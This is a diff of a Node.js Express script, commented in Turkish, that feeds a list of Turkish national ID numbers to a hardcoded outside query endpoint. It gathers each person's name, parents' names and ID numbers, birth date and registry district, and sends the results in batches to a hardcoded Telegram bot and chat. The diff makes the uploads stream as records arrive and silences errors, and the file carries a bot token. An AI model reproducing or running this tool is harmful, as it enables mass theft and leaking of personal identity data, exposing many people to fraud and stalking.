@@ -8,21 +8,37 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 const API_URL = 'http://45.81.113.22/apiler/aile.php';
-const TC_FILE = path.join(__dirname, 'BARBİ.txt'); // Dosya adını buraya yaz (blog.txt veya sahte_tcx_1200000.txt)
+const TC_FILE = path.join(__dirname, 'blog.txt'); // TC listeni buraya yükle
 
 const TELEGRAM_BOT_TOKEN = '8232579729:AAEPjPqCN33b-cQzDLKdeSatK8oi_b44vDo';
 const TELEGRAM_CHAT_ID = '8258235296';
 
 let progress = 0;
-let totalFetched = 0;
+let totalSuccess = 0;
 let totalTried = 0;
-let isFetching = false;
+let isRunning = false;
 
-async function fetchAllTc() {
-  if (isFetching) return;
-  isFetching = true;
+async function sendToTelegram(filePath, caption) {
+  try {
+    const form = new FormData();
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('document', await fs.readFile(filePath), path.basename(filePath));
+    form.append('caption', caption);
+
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
+      headers: form.getHeaders()
+    });
+    console.log(`Gönderildi: ${caption}`);
+  } catch (err) {
+    console.error('Telegram gönderme hatası:', err.message);
+  }
+}
+
+async function processTcList() {
+  if (isRunning) return;
+  isRunning = true;
   progress = 0;
-  totalFetched = 0;
+  totalSuccess = 0;
   totalTried = 0;
 
   let tcList;
@@ -31,13 +47,15 @@ async function fetchAllTc() {
     tcList = content.split('\n').map(t => t.trim()).filter(t => t.length === 11 && /^\d+$/.test(t));
   } catch (err) {
     console.error('TC dosyası okunamadı:', err);
+    isRunning = false;
     return;
   }
 
   const total = tcList.length;
   console.log(`Toplam ${total} TC yüklendi, başlıyoruz...`);
 
-  let txtContent = '';
+  let currentChunk = '';
+  let chunkPart = 1;
 
   for (let i = 0; i < total; i++) {
     const tc = tcList[i];
@@ -45,53 +63,47 @@ async function fetchAllTc() {
     progress = Math.round((totalTried / total) * 100);
 
     try {
-      const url = `\( {API_URL}?tc= \){tc}`;
-      const res = await axios.get(url, { timeout: 6000 });
+      const res = await axios.get(`\( {API_URL}?tc= \){tc}`, { timeout: 6000 });
       const data = res.data;
 
       if (data.success && data.data) {
+        totalSuccess++;
         const item = data.data;
-        totalFetched++;
+        currentChunk += `TC: ${item.TC || tc}\n`;
+        currentChunk += `ADI: ${item.ADI || ''} SOYADI: ${item.SOYADI || ''}\n`;
+        currentChunk += `ANNEADI: ${item.ANNEADI || ''} ANNETC: ${item.ANNETC || ''}\n`;
+        currentChunk += `BABAADI: ${item.BABAADI || ''} BABATC: ${item.BABATC || ''}\n`;
+        currentChunk += `DOGUMTARIHI: ${item.DOGUMTARIHI || ''}\n`;
+        currentChunk += `NUFUSIL: ${item.NUFUSIL || ''} NUFUSILCE: ${item.NUFUSILCE || ''}\n`;
+        currentChunk += '-------------------\n\n';
 
-        txtContent += `TC: ${item.TC || tc}\n`;
-        txtContent += `ADI: ${item.ADI || ''} SOYADI: ${item.SOYADI || ''}\n`;
-        txtContent += `ANNEADI: ${item.ANNEADI || ''} ANNETC: ${item.ANNETC || ''}\n`;
-        txtContent += `BABAADI: ${item.BABAADI || ''} BABATC: ${item.BABATC || ''}\n`;
-        txtContent += `DOGUMTARIHI: ${item.DOGUMTARIHI || ''}\n`;
-        txtContent += `NUFUSIL: ${item.NUFUSIL || ''} NUFUSILCE: ${item.NUFUSILCE || ''}\n`;
-        txtContent += '-------------------\n\n';
+        // 45 MB'a yaklaştığında gönder
+        if (currentChunk.length > 45 * 1024 * 1024) {
+          const tempFile = path.join(__dirname, `chunk_${chunkPart}.txt`);
+          await fs.writeFile(tempFile, currentChunk.trim(), 'utf8');
+          await sendToTelegram(tempFile, `Parça ${chunkPart} | Bulunan: ${totalSuccess} | Denenen: ${totalTried}`);
+          await fs.unlink(tempFile);
+          currentChunk = '';
+          chunkPart++;
+        }
       }
     } catch (err) {
-      console.log(`TC ${tc} hata: ${err.message}`);
+      // Hata olursa sessizce geç (log bile atmıyoruz, sadece konsola)
     }
 
     await new Promise(r => setTimeout(r, 400));
   }
 
-  await fs.writeFile(path.join(__dirname, 'tum_sonuc.txt'), txtContent.trim(), 'utf8');
-
-  // Telegram'a parça parça gönder
-  const fileContent = await fs.readFile(path.join(__dirname, 'tum_sonuc.txt'));
-  const fileSizeMB = fileContent.length / (1024 * 1024);
-
-  let part = 1;
-  const chunkSize = 45 * 1024 * 1024; // 45 MB parçalar
-  for (let offset = 0; offset < fileContent.length; offset += chunkSize) {
-    const chunk = fileContent.slice(offset, offset + chunkSize);
-    const form = new FormData();
-    form.append('chat_id', TELEGRAM_CHAT_ID);
-    form.append('document', chunk, `sonuc_part_${part}.txt`);
-    form.append('caption', `Parça ${part} | Bulunan: ${totalFetched} | Denenen: ${totalTried}`);
-
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
-      headers: form.getHeaders()
-    });
-    console.log(`Parça ${part} Telegram'a gönderildi`);
-    part++;
-    await new Promise(r => setTimeout(r, 2000));
+  // Kalan parçayı gönder
+  if (currentChunk) {
+    const tempFile = path.join(__dirname, `chunk_${chunkPart}.txt`);
+    await fs.writeFile(tempFile, currentChunk.trim(), 'utf8');
+    await sendToTelegram(tempFile, `Son Parça ${chunkPart} | Bulunan: ${totalSuccess} | Denenen: ${totalTried}`);
+    await fs.unlink(tempFile);
   }
 
-  isFetching = false;
+  console.log(`Bitti! Toplam ${totalSuccess} veri bulundu, Telegram'a gönderildi.`);
+  isRunning = false;
 }
 
 app.get('/', (req, res) => {
@@ -100,7 +112,7 @@ app.get('/', (req, res) => {
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>TC Sorgu Servisi</title>
+  <title>TC Veri Gönderici</title>
   <style>
     body { font-family: Arial; text-align: center; background: #f0f4f8; padding: 30px; }
     h1 { color: #1a5276; }
@@ -110,19 +122,19 @@ app.get('/', (req, res) => {
   </style>
 </head>
 <body>
-  <h1>TC Listesinden Veri Çekici</h1>
+  <h1>TC Listesinden Veri Gönderici</h1>
   <div class="progress">%${progress}</div>
-  <div class="count">Bulunan: ${totalFetched} / Denenen: ${totalTried}</div>
+  <div class="count">Gönderilen Veri: ${totalSuccess} / Denenen: ${totalTried}</div>
 
-  ${progress < 100 ? '<div class="status">Sorgu arka planda çalışıyor... Loglara bakın.</div>' : '<div class="status">İşlem bitti! TXT Telegram\'a gitti.</div>'}
+  ${progress < 100 ? '<div class="status">Arka planda çalışıyor... Loglara bakın.</div>' : '<div class="status">Bitti! Veriler Telegram\'a gitti.</div>'}
 </body>
 </html>`);
 });
 
 app.get('/start', async (req, res) => {
-  if (totalFetched === 0 && !isFetching) {
-    fetchAllTc();
-    res.send('Sorgu başladı! Loglara bakın, bitince Telegram\'a gider.');
+  if (totalSuccess === 0 && !isRunning) {
+    processTcList();
+    res.send('Başladı! Veriler geldikçe Telegram\'a parça parça gider.');
   } else {
     res.send('Zaten çalışıyor veya tamamlandı.');
   }
